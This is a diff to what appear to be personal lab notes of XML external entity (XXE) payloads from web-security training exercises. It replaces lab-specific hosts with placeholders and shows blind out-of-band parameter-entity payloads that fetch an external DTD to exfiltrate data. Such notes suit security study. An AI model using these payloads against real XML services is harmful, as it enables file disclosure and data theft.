@@ -11,7 +11,7 @@
 
 <!-- Blind XXE with out-of-band interaction using parameter entity
     For this one you do not put &xxe in the body-->
-<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://qc6w9fzp7dllrn61bp2rx6g6gxmoaiy7.oastify.com"> %xxe; ]>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "<YOUR-COLLABORATOR>"> %xxe; ]>
 
 <!-- Blind XXE using a external DTD -->
 <!-- DTD Contents -->
@@ -26,7 +26,7 @@
 %exfiltrate;
 
 <!-- xxe to call for dtd to be downloaded -->
-<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a590060036c3abf822f84b101970034.exploit-server.net/exploit.dtd"> %xxe; ]>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://YOUR-EXPLOIT-LAB-ID.web-security-academy.net/exploit.dtd"> %xxe; ]>
 
 <!-- Blind XXE using a external DTD and error messages -->
 <!-- DTD Contents -->
